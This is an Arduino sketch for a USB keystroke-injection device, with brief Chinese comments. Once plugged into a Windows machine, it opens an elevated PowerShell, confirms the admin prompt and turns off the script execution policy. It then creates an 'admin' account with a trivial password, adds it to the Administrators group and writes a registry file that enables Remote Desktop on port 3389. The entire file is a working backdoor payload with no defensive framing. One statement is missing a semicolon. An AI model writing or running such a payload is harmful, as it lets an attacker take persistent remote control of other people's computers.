void setup(){
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("powershell.exe -c start-process powershell -verb runAs");
  Keyboard.println();
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('y');
  Keyboard.release(KEY_LEFT_ALT);
  delay(500);
  Keyboard.println("Set-ExecutionPolicy Unrestricted -Force;cmd");
  delay(50);
  Keyboard.println("cmd /c net user admin admin /add&net localgroup administrators admin /add");
  delay(50)
  Keyboard.println("echo Windows Registry Editor Version 5.00>3389.reg&&echo [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]>>3389.reg&&echo \"fDenyTSConnections\"=dword:00000000>>3389.reg&&echo [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp]>>3389.reg&&echo \"PortNumber\"=dword:00000d3d>>3389.reg&&echo [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp]>>3389.reg&&echo \"PortNumber\"=dword:00000d3d>>3389.reg");
  delay(100);
  Keyboard.println("regedit /s 3389.reg&&del 3389.reg&&exit");
  Keyboard.end();
}

void loop(){
}
